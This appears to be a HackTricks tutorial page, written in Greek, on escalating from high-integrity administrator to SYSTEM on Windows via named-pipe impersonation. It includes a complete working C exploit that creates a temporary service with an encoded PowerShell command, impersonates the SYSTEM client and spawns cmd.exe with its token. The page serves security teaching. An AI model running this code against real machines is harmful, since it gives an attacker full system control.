# Από High Integrity σε SYSTEM με Name Pipes

{{#include ../../banners/hacktricks-training.md}}

Αυτή είναι η **παραλλαγή administrator/SCM** του named-pipe impersonation: μια elevated διεργασία δημιουργεί ένα προσωρινό service, του οποίου το child συνδέεται ως `SYSTEM` και στη συνέχεια κάνει impersonate αυτόν τον client. Αν το αρχικό context δεν μπορεί να δημιουργήσει services αλλά διαθέτει `SeImpersonatePrivilege`, χρησιμοποίησε αντ' αυτού privileged-service coercion· δες τα [Named Pipe Client Impersonation](named-pipe-client-impersonation.md) και [RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato](roguepotato-and-printspoofer.md). Η δημιουργία του service απαιτεί access στο SCM και access `SERVICE_START` στο νέο service, ενώ το `CreateProcessWithTokenW` απαιτεί `SeImpersonatePrivilege`.<sup>[[2]](#references)[[3]](#references)</sup>

Επιβεβαίωσε γρήγορα το αναμενόμενο αρχικό context:
```cmd
whoami /groups | findstr /i "High Mandatory"
whoami /priv | findstr /i "SeImpersonatePrivilege"
sc.exe query PiperSrv
```
**Ροή κώδικα:**

1. Δημιουργήστε τον named-pipe server **πριν** ξεκινήσετε το service. Κατά την αναμονή, θεωρήστε ότι η επιστροφή `FALSE` από το `ConnectNamedPipe` με `ERROR_PIPE_CONNECTED` αποτελεί επιτυχία: σημαίνει ότι ο client κέρδισε την κούρσα και συνδέθηκε μεταξύ των `CreateNamedPipe` και `ConnectNamedPipe`.<sup>[[4]](#references)</sup>
2. Δημιουργήστε και ξεκινήστε ένα service που θα συνδεθεί στο δημιουργημένο pipe και θα γράψει κάτι. Ο κώδικας του service θα εκτελέσει αυτόν τον κωδικοποιημένο PS code: `$pipe = new-object System.IO.Pipes.NamedPipeClientStream("piper"); $pipe.Connect(); $sw = new-object System.IO.StreamWriter($pipe); $sw.WriteLine("Go"); $sw.Dispose();`
3. Αφού το service συνδεθεί και γράψει, καλέστε το `ImpersonateNamedPipeClient`, ανοίξτε το thread token που προκύπτει και αντιγράψτε το ως primary token.<sup>[[1]](#references)</sup>
4. Χρησιμοποιήστε αυτό το primary token για να εκκινήσετε το `cmd.exe`.<sup>[[2]](#references)</sup>

Αυτή η διαδρομή προϋποθέτει ότι ο caller μπορεί να δημιουργήσει/ξεκινήσει ένα service και διαθέτει τα privileges που απαιτούνται από το `CreateProcessWithTokenW` (συνήθως το `SeImpersonatePrivilege`). Πρόκειται για τεχνική high-integrity-to-SYSTEM και όχι για primitive που είναι διαθέσιμο σε οποιονδήποτε low-privileged user.<sup>[[2]](#references)[[3]](#references)</sup>

> [!WARNING]
> Αν η δημιουργία/εκκίνηση του service αποτύχει, το sample δεν ειδοποιεί το pipe thread και μπορεί να περιμένει επ' αόριστον. Προσθέστε error handling και overlapped pipe timeout πριν το χρησιμοποιήσετε εκτός lab. Χρησιμοποιήστε επίσης ένα τυχαίο όνομα pipe/service για την αποφυγή collisions.

Το `ImpersonateNamedPipeClient` υιοθετεί το context που σχετίζεται με το **τελευταίο μήνυμα που διαβάστηκε**, επομένως μια σύνδεση από μόνη της δεν επαρκεί: ζητήστε από τον privileged client να γράψει, επαληθεύστε ότι το `ReadFile` επέστρεψε δεδομένα και μόνο τότε εκτελέστε impersonation. Αντιγράψτε το thread impersonation token σε token `TokenPrimary` με `SecurityImpersonation`· primary token είναι αυτό που καταναλώνει το process-creation API.<sup>[[1]](#references)[[5]](#references)</sup>
```c
#include <windows.h>
#include <time.h>

#pragma comment (lib, "advapi32")
#pragma comment (lib, "kernel32")

#define PIPESRV "PiperSrv"
#define MESSAGE_SIZE 512

DWORD WINAPI ServiceGo(LPVOID lpParam) {

SC_HANDLE scManager;
SC_HANDLE scService;

scManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);

if (scManager == NULL) {
return FALSE;
}

// create Piper service
scService = CreateServiceA(scManager, PIPESRV, PIPESRV, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
"C:\\Windows\\System32\\cmd.exe /c powershell.exe -EncodedCommand JABwAGkAcABlACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFAAaQBwAGUAcwAuAE4AYQBtAGUAZABQAGkAcABlAEMAbABpAGUAbgB0AFMAdAByAGUAYQBtACgAIgBwAGkAcABlAHIAIgApADsAIAAkAHAAaQBwAGUALgBDAG8AbgBuAGUAYwB0ACgAKQA7ACAAJABzAHcAIAA9ACAAbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUwB0AHIAZQBhAG0AVwByAGkAdABlAHIAKAAkAHAAaQBwAGUAKQA7ACAAJABzAHcALgBXAHIAaQB0AGUATABpAG4AZQAoACIARwBvACIAKQA7ACAAJABzAHcALgBEAGkAcwBwAG8AcwBlACgAKQA7AA==",
NULL, NULL, NULL, NULL, NULL);

if (scService == NULL) {
//printf("[!] CreateServiceA() failed: [%d]\n", GetLastError());
return FALSE;
}

// launch it
StartService(scService, 0, NULL);

// wait a bit and then cleanup
Sleep(10000);
DeleteService(scService);

CloseServiceHandle(scService);
CloseServiceHandle(scManager);
}

int main() {

LPCSTR sPipeName = "\\\\.\\pipe\\piper";
HANDLE hSrvPipe;
HANDLE th;
BOOL bPipeConn;
char pPipeBuf[MESSAGE_SIZE];
DWORD dBRead = 0;

HANDLE hImpToken;
HANDLE hNewToken;
STARTUPINFOW si;
PROCESS_INFORMATION pi;

// open pipe
hSrvPipe = CreateNamedPipeA(sPipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_WAIT,
PIPE_UNLIMITED_INSTANCES, 1024, 1024, 0, NULL);

// create and run service
th = CreateThread(0, 0, ServiceGo, NULL, 0, 0);

// wait for the connection from the service
bPipeConn = ConnectNamedPipe(hSrvPipe, NULL);
if (!bPipeConn && GetLastError() == ERROR_PIPE_CONNECTED) {
bPipeConn = TRUE; // Client connected between CreateNamedPipe and ConnectNamedPipe
}
if (bPipeConn) {
if (!ReadFile(hSrvPipe, &pPipeBuf, MESSAGE_SIZE, &dBRead, NULL) || dBRead == 0) {
return -6;
}

// impersonate the service (SYSTEM)
if (ImpersonateNamedPipeClient(hSrvPipe) == 0) {
return -1;
}

// wait for the service to cleanup
WaitForSingleObject(th, INFINITE);

// get a handle to impersonated token
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hImpToken)) {
return -2;
}

// create new primary token for new process
if (!DuplicateTokenEx(hImpToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation,
TokenPrimary, &hNewToken)) {
return -4;
}

//Sleep(20000);
// spawn cmd.exe as full SYSTEM user
ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));
if (!CreateProcessWithTokenW(hNewToken, 0, L"C:\\Windows\\System32\\cmd.exe", NULL,
CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
return -5;
}

// revert back to original security context
RevertToSelf();

}

return 0;
}
```
### Αντιμετώπιση αποτυχιών

- `ConnectNamedPipe == FALSE` με `ERROR_PIPE_CONNECTED`: συνεχίστε· το pipe είναι ήδη συνδεδεμένο.<sup>[[4]](#references)</sup>
- Το `ImpersonateNamedPipeClient` αποτυγχάνει με `ERROR_CANNOT_IMPERSONATE` (`1368`): επιβεβαιώστε ότι ο client SYSTEM έγραψε πράγματι δεδομένα και ότι το `ReadFile` ολοκληρώθηκε. Ελέγξτε επίσης το ζητούμενο επίπεδο impersonation του client· οι clients σε επίπεδο identification/anonymous δεν μπορούν να υποδυθούν πλήρως την ταυτότητά τους.<sup>[[1]](#references)</sup>
- Το `CreateProcessWithTokenW` αποτυγχάνει με `ERROR_PRIVILEGE_NOT_HELD` (`1314`): ο αρχικός caller δεν διαθέτει το `SeImpersonatePrivilege`. Από context administrator με υψηλή ακεραιότητα, χρησιμοποιήστε τη διαδρομή αντιγραφής token που τεκμηριώνεται στο [SeImpersonate from High To System](seimpersonate-from-high-to-system.md), ή χρησιμοποιήστε το `CreateProcessAsUserW` ενώ κάνετε impersonation του SYSTEM, εφόσον υπάρχουν τα απαιτούμενα privileges.<sup>[[2]](#references)</sup>
- Το `CreateServiceA` επιστρέφει `ERROR_SERVICE_EXISTS` (`1073`): διαγράψτε την παλιά καταχώριση `PiperSrv` ή τυχαιοποιήστε το `PIPESRV`· διαγράφετε πάντα το προσωρινό service μετά το trigger.<sup>[[3]](#references)</sup>



## References

- [1] [Microsoft Learn — `ImpersonateNamedPipeClient`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [2] [Microsoft Learn — `CreateProcessWithTokenW`](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [3] [Microsoft Learn — `CreateServiceA`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)
- [4] [Microsoft Learn — `ConnectNamedPipe`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-connectnamedpipe)
- [5] [Microsoft Learn — `DuplicateTokenEx`](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex)
{{#include ../../banners/hacktricks-training.md}}
